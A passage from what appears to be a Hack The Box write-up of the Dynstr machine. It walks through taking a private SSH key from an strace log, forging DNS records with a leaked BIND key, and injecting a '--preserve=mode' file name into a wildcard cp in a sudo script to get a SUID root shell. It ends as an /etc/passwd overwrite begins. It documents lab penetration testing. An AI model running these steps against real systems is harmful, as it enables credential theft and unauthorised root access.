+<p><code class="language-plaintext highlighter-rouge">id_rsa</code> and <code class="language-plaintext highlighter-rouge">id_rsa.pub</code> are likely a key pair. <code class="language-plaintext highlighter-rouge">authorized_keys</code> defines who can connect (and how). <code class="language-plaintext highlighter-rouge">known_hosts</code> describes hosts that the client has SSHed to.</p>
+<p>I wanted to check if the key here is in <code class="language-plaintext highlighter-rouge">authorized_keys</code>, and it is:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dynstr:/home/bindmgr/.ssh$</span><span class="w"> </span><span class="nb">cat </span>authorized_keys 
+<span class="go">from="*.infra.dyna.htb" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
+</span><span class="gp">www-data@dynstr:/home/bindmgr/.ssh$</span><span class="w"> </span><span class="nb">cat </span>id_rsa.pub 
+<span class="go">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
+</span></code></pre></div></div>
+<p>There’s also something interesting at the start of the line: <code class="language-plaintext highlighter-rouge">from="*.infra.dyna.htb"</code>. Florian Roth <a href="https://twitter.com/cyb3rops/status/1395009709787258882">tweeted about this</a> (after Dynstr had been submitted to HTB, but before it went live):</p>
+<blockquote class="twitter-tweet"><p dir="ltr" lang="en">TIL  authorized_keys files can contain more than just public keys.  <br/>You can control source hosts of each key, limit the port  forwarding, execute commands upon login.<br/>In 20+ years of  working on Unix/Linux systems, I've never seen this used. <a href="https://t.co/XZeG9s6srV">https://t.co/XZeG9s6srV</a> <a href="https://t.co/WZ9M3iUKXQ">pic.twitter.com/WZ9M3iUKXQ</a></p>— Florian Roth (@cyb3rops) <a href="https://twitter.com/cyb3rops/status/1395009709787258882?ref_src=twsrc%5Etfw">May 19, 2021</a></blockquote>
+<script async="" charset="utf-8" src="https://platform.twitter.com/widgets.js"></script>
+<p>It’s also in the <a href="http://man.he.net/man5/authorized_keys">man page</a>. So that key can only connect from <code class="language-plaintext highlighter-rouge">*.infra.dyna.htb</code>. I’m not able to read the private key.</p>
+<h4 id="support-case">Support Case</h4>
+<p>The support case directory contains four readable files:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dynstr:/home/bindmgr/support-case-C62796521$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
+<span class="go">total 428
+-rw-r--r-- 1 bindmgr bindmgr 237141 Mar 13 14:53 C62796521-debugging.script
+-rw-r--r-- 1 bindmgr bindmgr  29312 Mar 13 14:53 C62796521-debugging.timing
+-rw-r--r-- 1 bindmgr bindmgr   1175 Mar 13 14:53 command-output-C62796521.txt
+-rw-r--r-- 1 bindmgr bindmgr 163048 Mar 13 14:52 strace-C62796521.txt
+</span></code></pre></div></div>
+<p>The files seem to be the output of a debugging session the user is doing. The files can be viewed with <code class="language-plaintext highlighter-rouge">cat</code> or <code class="language-plaintext highlighter-rouge">less</code>, but it’s neat to see them with <code class="language-plaintext highlighter-rouge">scriptreplay [.timing file] [.script file]</code>:</p>
+<p><img alt="" src="https://0xdfimages.gitlab.io/img/scriptreplay.gif"/></p>
+<p><em>If you see a shell as bindmgr, that’s because it’s part of the reply. Wait for the GIF to restart, or refresh the page to see it from the start.</em></p>
+<p>The users is trying to troubleshoot an SFTP connection using <code class="language-plaintext highlighter-rouge">curl</code>, and the connection is using the key pair for auth. The important part of the replay is when the admin attaches <code class="language-plaintext highlighter-rouge">strace</code> to the process, and even saves that to a file:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20210613153827802.png"><img alt="image-20210613153827802" src="https://0xdfimages.gitlab.io/img/image-20210613153827802.png"/><em>Click for full size image</em></a></p>
+<p><code class="language-plaintext highlighter-rouge">strace</code> will capture the private key as it’s used. <code class="language-plaintext highlighter-rouge">grep</code> finds it easily:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dynstr:/home/bindmgr/support-case-C62796521$</span><span class="w"> </span><span class="nb">grep </span>BEGIN strace-C62796521.txt 
+<span class="go">15123 read(5, "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n", 4096) = 1823
+</span></code></pre></div></div>
+<p>A bit of <code class="language-plaintext highlighter-rouge">cut</code> and <code class="language-plaintext highlighter-rouge">sed</code> will isolate the key:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dynstr:/home/bindmgr/support-case-C62796521$</span><span class="w"> </span><span class="nb">grep </span>BEGIN strace-C62796521.txt | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">'"'</span> <span class="nt">-f2</span> | <span class="nb">sed</span> <span class="s1">'s/\\n/\'$'</span><span class="se">\n</span><span class="s1">''/g'</span>
+<span class="go">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1
+...[snip]...
+rlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG
+jGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==
+-----END OPENSSH PRIVATE KEY-----
+</span></code></pre></div></div>
+<p>With the private key, I still can’t connect unless I’m coming from <code class="language-plaintext highlighter-rouge">*.infra.dyna.htb</code> as shown above.</p>
+<h4 id="dns-configuration">DNS Configuration</h4>
+<p><code class="language-plaintext highlighter-rouge">resolve.conf</code> shows that Dynstr is using itself as a DNS server:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dynstr:/$</span><span class="w"> </span><span class="nb">cat</span> /etc/resolv.conf | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"^#"</span>
+<span class="go">nameserver 127.0.0.1
+</span></code></pre></div></div>
+<p>I can try to update the DNS resolver so that my IP has a <code class="language-plaintext highlighter-rouge">*.infra.dyna.htb</code> name, but it fails:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dynstr:/home/bindmgr/support-case-C62796521$</span><span class="w"> </span>nsupdate
+<span class="go">&gt; server 127.0.0.1
+&gt; zone infra.dyna.htb
+&gt; update add 0xdf.infra.dyna.htb 30 IN A 10.10.14.8
+&gt; send
+update failed: NOTAUTH
+</span></code></pre></div></div>
+<p>To better understand how the Bind server is configured. There’s a bunch of files in <code class="language-plaintext highlighter-rouge">/etc/bind</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dynstr:/etc/bind$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">bind.keys  db.127  db.empty  ddns.key   named.bindmgr  named.conf.default-zones  named.conf.options  zones.rfc1918
+db.0       db.255  db.local  infra.key  named.conf     named.conf.local          rndc.key
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">named.conf.local</code> contains the interesting bits:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// Add infrastructure DNS updates.
+include <span class="s2">"/etc/bind/infra.key"</span><span class="p">;</span>
+zone <span class="s2">"dyna.htb"</span> IN <span class="o">{</span> <span class="nb">type </span>master<span class="p">;</span> file <span class="s2">"dyna.htb.zone"</span><span class="p">;</span> update-policy <span class="o">{</span> grant infra-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
+zone <span class="s2">"10.in-addr.arpa"</span> IN <span class="o">{</span> <span class="nb">type </span>master<span class="p">;</span> file <span class="s2">"10.in-addr.arpa.zone"</span><span class="p">;</span> update-policy <span class="o">{</span> grant infra-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
+zone <span class="s2">"168.192.in-addr.arpa"</span> IN <span class="o">{</span> <span class="nb">type </span>master<span class="p">;</span> file <span class="s2">"168.192.in-addr.arpa.zone"</span><span class="p">;</span> update-policy <span class="o">{</span> grant infra-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
+// Enable DynDNS updates to customer zones.
+include <span class="s2">"/etc/bind/ddns.key"</span><span class="p">;</span>
+zone <span class="s2">"dnsalias.htb"</span> IN <span class="o">{</span> <span class="nb">type </span>master<span class="p">;</span> file <span class="s2">"dnsalias.htb.zone"</span><span class="p">;</span> update-policy <span class="o">{</span> grant ddns-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
+zone <span class="s2">"dynamicdns.htb"</span> IN <span class="o">{</span> <span class="nb">type </span>master<span class="p">;</span> file <span class="s2">"dynamicdns.htb.zone"</span><span class="p">;</span> update-policy <span class="o">{</span> grant ddns-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
+zone <span class="s2">"no-ip.htb"</span> IN <span class="o">{</span> <span class="nb">type </span>master<span class="p">;</span> file <span class="s2">"no-ip.htb.zone"</span><span class="p">;</span> update-policy <span class="o">{</span> grant ddns-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
+</code></pre></div></div>
+<p>This second line defines how the <code class="language-plaintext highlighter-rouge">dyna.htb</code> zone (or domain) is updated. The <code class="language-plaintext highlighter-rouge">update-policy</code> says that it will be granted with access to the <code class="language-plaintext highlighter-rouge">infra-key</code> file, which included in the first line. I also have permission to read it as www-data:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dynstr:/etc/bind$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> infra.key
+<span class="go">-rw-r--r-- 1 root bind 101 Mar 15 20:44 infra.key
+</span></code></pre></div></div>
+<h3 id="update-dns">Update DNS</h3>
+<p>I have all the pieces I need to update the DNS at this point. I could look at the web code as an example of how to make the <code class="language-plaintext highlighter-rouge">nsupdate</code> call (I’ll dig into that in <a href="#no-ip-api">Beyond Root</a>), or look at the <a href="https://linux.die.net/man/8/nsupdate">man page</a>. I’ll set it so that both the A record for 0xdf.infra.dyna.htb points at my IP, and that the PTR record for 8.14.10.10.in-addr.arpa points at 0xdf.infra.dyna.htb (to satisfy the reverse lookup of the IP):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dynstr:/etc/bind$</span><span class="w"> </span>nsupdate <span class="nt">-k</span> infra.key 
+<span class="go">&gt; server 127.0.0.1
+&gt; zone dyna.htb
+&gt; update add 0xdf.infra.dyna.htb 30 IN A 10.10.14.8
+&gt; send
+&gt; zone 10.in-addr.arpa
+&gt; update add 8.14.10.10.in-addr.arpa 30 IN PTR 0xdf.infra.dyna.htb
+&gt; send
+</span></code></pre></div></div>
+<h3 id="ssh-1">SSH</h3>
+<p>With those records set, I can SSH as bindmgr:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/dynstr-bindmgr bindmgr@10.10.10.244
+<span class="go">Last login: Sun Jun 13 12:13:42 2021 from 90e30693769f4068a9ffb5a187745264.infra.dyna.htb
+</span><span class="gp">bindmgr@dynstr:~$</span><span class="w"> 
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<p><code class="language-plaintext highlighter-rouge">sudo -l</code> gives something interesting right away:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bindmgr@dynstr:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
+Matching Defaults entries for bindmgr on dynstr:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User bindmgr may run the following commands on dynstr:
+    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh
+</span></code></pre></div></div>
+<p>bindmgr can run <code class="language-plaintext highlighter-rouge">/usr/local/bin/bindmgr.sh</code> as root without a password.</p>
+<h3 id="bindmgrsh">bindmgr.sh</h3>
+<p>Just running the script returns an error about the version:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bindmgr@dynstr:~$</span><span class="w"> </span><span class="nb">sudo </span>bindmgr.sh 
+<span class="go">sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
+[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /home/bindmgr.
+[-] ERROR: Check versioning. Exiting.
+</span></code></pre></div></div>
+<p>I am able to read and execute it, but not write:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bindmgr@dynstr:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/local/bin/bindmgr.sh 
+<span class="go">-rwxr-xr-x 1 root root 2184 Mar 15 20:28 /usr/local/bin/bindmgr.sh
+</span></code></pre></div></div>
+<p>I’ll walk through the script in chunks. At the top is has the shebang for a Bash script, some comments, and defines a couple static directories and a macro to indent:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/bash</span>
+
+<span class="c"># This script generates named.conf.bindmgr to workaround the problem           </span>
+<span class="c"># that bind/named can only include single files but no directories.            </span>
+<span class="c">#</span>
+<span class="c"># It creates a named.conf.bindmgr file in /etc/bind that can be included       </span>
+<span class="c"># from named.conf.local (or others) and will include all files from the        </span>
+<span class="c"># directory /etc/bin/named.bindmgr.</span>
+<span class="c">#</span>
+<span class="c"># NOTE: The script is work in progress. For now bind is not including          </span>
+<span class="c">#       named.conf.bindmgr.</span>
+<span class="c">#</span>
+<span class="c"># TODO: Currently the script is only adding files to the directory but         </span>
+<span class="c">#       not deleting them. As we generate the list of files to be included</span>
+<span class="c">#       from the source directory they won't be included anyway.               </span>
+
+<span class="nv">BINDMGR_CONF</span><span class="o">=</span>/etc/bind/named.conf.bindmgr                                      
+<span class="nv">BINDMGR_DIR</span><span class="o">=</span>/etc/bind/named.bindmgr
+
+indent<span class="o">()</span> <span class="o">{</span> <span class="nb">sed</span> <span class="s1">'s/^/    /'</span><span class="p">;</span> <span class="o">}</span>  
+</code></pre></div></div>
+<p>The comments mention that the script is in development, and designed to create a file to be included by Bind.</p>
+<p>Next there are version checks:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check versioning (.version)</span>
+<span class="nb">echo</span> <span class="s2">"[+] Running </span><span class="nv">$0</span><span class="s2"> to stage new configuration from </span><span class="nv">$PWD</span><span class="s2">."</span>
+<span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-f</span> .version <span class="o">]]</span> <span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"[-] ERROR: Check versioning. Exiting."</span>
+    <span class="nb">exit </span>42
+<span class="k">fi
+if</span> <span class="o">[[</span> <span class="s2">"</span><span class="sb">`</span><span class="nb">cat</span> .version 2&gt;/dev/null<span class="sb">`</span><span class="s2">"</span> <span class="nt">-le</span> <span class="s2">"</span><span class="sb">`</span><span class="nb">cat</span> <span class="nv">$BINDMGR_DIR</span>/.version 2&gt;/dev/null<span class="sb">`</span><span class="s2">"</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"[-] ERROR: Check versioning. Exiting."</span>
+    <span class="nb">exit </span>43
+<span class="k">fi</span>
+</code></pre></div></div>
+<p>To get past this, I’ll need a <code class="language-plaintext highlighter-rouge">.version</code> file in the local directory that has a number greater than the <code class="language-plaintext highlighter-rouge">.version</code> file in <code class="language-plaintext highlighter-rouge">/etc/bin/named.bindmgr</code>.</p>
+<p>Now it creates a config file that includes all the files in the local directory:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Create config file that includes all files from named.bindmgr.</span>
+<span class="nb">echo</span> <span class="s2">"[+] Creating </span><span class="nv">$BINDMGR_CONF</span><span class="s2"> file."</span>
+<span class="nb">printf</span> <span class="s1">'// Automatically generated file. Do not modify manually.\n'</span> <span class="o">&gt;</span> <span class="nv">$BINDMGR_CONF</span>
+<span class="k">for </span>file <span class="k">in</span> <span class="k">*</span> <span class="p">;</span> <span class="k">do
+    </span><span class="nb">printf</span> <span class="s1">'include "/etc/bind/named.bindmgr/%s";\n'</span> <span class="s2">"</span><span class="nv">$file</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> <span class="nv">$BINDMGR_CONF</span>
+<span class="k">done</span>
+</code></pre></div></div>
+<p>Next it copies all the files in the local directory to <code class="language-plaintext highlighter-rouge">/etc/bind/named.bindmgr/</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Stage new version of configuration files.</span>
+<span class="nb">echo</span> <span class="s2">"[+] Staging files to </span><span class="nv">$BINDMGR_DIR</span><span class="s2">."</span>
+<span class="nb">cp</span> .version <span class="k">*</span> /etc/bind/named.bindmgr/
+</code></pre></div></div>
+<p>Finally, it checks that the conf file is valid using <code class="language-plaintext highlighter-rouge">named-checkconf</code>, and if it is, it has a commented line to restart the bind service using <code class="language-plaintext highlighter-rouge">systemctl</code> (and a comment saying it’s “TODO once live”):</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check generated configuration with named-checkconf.</span>
+<span class="nb">echo</span> <span class="s2">"[+] Checking staged configuration."</span>
+named-checkconf <span class="nv">$BINDMGR_CONF</span> <span class="o">&gt;</span>/dev/null
+<span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> <span class="nt">-ne</span> 0 <span class="o">]]</span> <span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"[-] ERROR: The generated configuration is not valid. Please fix following errors: "</span>
+    named-checkconf <span class="nv">$BINDMGR_CONF</span> 2&gt;&amp;1 | indent
+    <span class="nb">exit </span>44
+<span class="k">else 
+    </span><span class="nb">echo</span> <span class="s2">"[+] Configuration successfully staged."</span>
+    <span class="c"># *** TODO *** Uncomment restart once we are live.</span>
+    <span class="c"># systemctl restart bind9</span>
+    <span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> <span class="nt">-ne</span> 0 <span class="o">]]</span> <span class="p">;</span> <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"[-] Restart of bind9 via systemctl failed. Please check logfile: "</span>
+        systemctl status bind9
+    <span class="k">else
+        </span><span class="nb">echo</span> <span class="s2">"[+] Restart of bind9 via systemctl succeeded."</span>
+    <span class="k">fi
+fi</span>
+</code></pre></div></div>
+<h3 id="wildcard-exploit">Wildcard Exploit</h3>
+<h4 id="strategy">Strategy</h4>
+<p>The vulnerable line is this:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> .version <span class="k">*</span> /etc/bind/named.bindmgr/
+</code></pre></div></div>
+<p>It allows me to write any file I want into that directory owned as root. That on it’s own is not bad. But because of how Bash handles wildcards, if I create a file that looks like an option for <code class="language-plaintext highlighter-rouge">cp</code>, it will expand into place and be applied to that <code class="language-plaintext highlighter-rouge">cp</code>.</p>
+<h4 id="preserve">–preserve</h4>
+<p>Looking at the <code class="language-plaintext highlighter-rouge">cp</code> <a href="https://linux.die.net/man/1/cp">man page</a>, the <code class="language-plaintext highlighter-rouge">--preserve</code> option is interesting:</p>
+<blockquote>
+<p><strong>–preserve</strong>[=<em>ATTR_LIST</em>]</p>
+<p>preserve the specified attributes (default:  mode,ownership,timestamps), if possible additional attributes: context,  links, xattr, all</p>
+</blockquote>
+<p>I don’t want to preserver ownership or timestamp, but preserving mode would allow me to create a SUID binary and then have it owned by root.</p>
+<p>I’ll work out of <code class="language-plaintext highlighter-rouge">/dev/shm</code>, and first, create a version file to get past that check:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bindmgr@dynstr:/dev/shm$</span><span class="w"> </span><span class="nb">echo </span>100 <span class="o">&gt;</span> .version
+<span class="go">
+</span><span class="gp">bindmgr@dynstr:/dev/shm$</span><span class="w"> </span><span class="nb">sudo </span>bindmgr.sh 
+<span class="go">sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
+[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /dev/shm.
+[+] Creating /etc/bind/named.conf.bindmgr file.
+[+] Staging files to /etc/bind/named.bindmgr.
+cp: cannot stat '*': No such file or directory
+[+] Checking staged configuration.
+[-] ERROR: The generated configuration is not valid. Please fix following errors: 
+    /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/*: file not found
+</span></code></pre></div></div>
+<p>It errors out because there are no files. I’ll create two. First, I’ll copy <code class="language-plaintext highlighter-rouge">bash</code> in and set it SUID. Then, I’ll <code class="language-plaintext highlighter-rouge">touch -- --preserve=mode</code>.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bindmgr@dynstr:/dev/shm$</span><span class="w"> </span><span class="nb">cp</span> /bin/bash <span class="nb">.</span>
+<span class="gp">bindmgr@dynstr:/dev/shm$</span><span class="w"> </span><span class="nb">chmod </span>4777 bash 
+<span class="gp">bindmgr@dynstr:/dev/shm$</span><span class="w"> </span><span class="nb">touch</span> <span class="nt">--</span> <span class="nt">--preserve</span><span class="o">=</span>mode
+</code></pre></div></div>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">sudo bindmgr.sh</code>, and the script fails at the config check, but the SUID <code class="language-plaintext highlighter-rouge">bash</code> is now there:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bindmgr@dynstr:/dev/shm$</span><span class="w"> </span><span class="nb">sudo </span>bindmgr.sh 
+<span class="go">sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
+[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /dev/shm.
+[+] Creating /etc/bind/named.conf.bindmgr file.
+[+] Staging files to /etc/bind/named.bindmgr.
+[+] Checking staged configuration.
+[-] ERROR: The generated configuration is not valid. Please fix following errors: 
+    /etc/bind/named.bindmgr/bash:1: unknown option 'ELF...'
+    /etc/bind/named.bindmgr/bash:14: unknown option 'hȀE'
+    /etc/bind/named.bindmgr/bash:40: unknown option 'YF'
+    /etc/bind/named.bindmgr/bash:40: unexpected token near '}'
+
+</span><span class="gp">bindmgr@dynstr:/dev/shm$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /etc/bind/named.bindmgr/
+<span class="go">total 1156
+-rwsrwxrwx 1 root bind 1183448 Jun 13 22:49 bash
+</span></code></pre></div></div>
+<p>Running it (with <code class="language-plaintext highlighter-rouge">-p</code> to avoid dropping privs) gives a root shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bindmgr@dynstr:/dev/shm$</span><span class="w"> </span>/etc/bind/named.bindmgr/bash <span class="nt">-p</span>
+<span class="go">bash-5.0# 
+</span></code></pre></div></div>
+<p>And the flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bash-5.0#</span><span class="w"> </span><span class="nb">cat</span> /root/root.txt
+<span class="go">5dd46220************************
+</span></code></pre></div></div>
+<h4 id="target-directory">–target-directory</h4>
+<p>The <code class="language-plaintext highlighter-rouge">--target-directory</code> flag is also a way to get root. My first thought was to write an SSH key to <code class="language-plaintext highlighter-rouge">/root/.ssh</code>, but that didn’t work (turns out that <code class="language-plaintext highlighter-rouge">/root/.ssh</code> doesn’t exist). Still, I can overwrite <code class="language-plaintext highlighter-rouge">/etc/passwd</code>. I’ll need four files.</p>
+<p>First I need a modified copy of the <code class="language-plaintext highlighter-rouge">passwd</code> file with my user included:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bindmgr@dynstr:/tmp/tmp.fyyGsVJY8c$ </span><span class="nb">cd</span> <span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>
+<span class="gp">bindmgr@dynstr:/tmp/tmp.Fk4IdAaCre$ </span><span class="nb">cp</span> /etc/passwd <span class="nb">.</span>
+<span class="gp">bindmgr@dynstr:/tmp/tmp.Fk4IdAaCre$ </span>openssl passwd <span class="nt">-1</span> 0xdf
+<span class="go">$1$KLTiIosS$EcdrRFwOKrCmloQFSZ2zn1
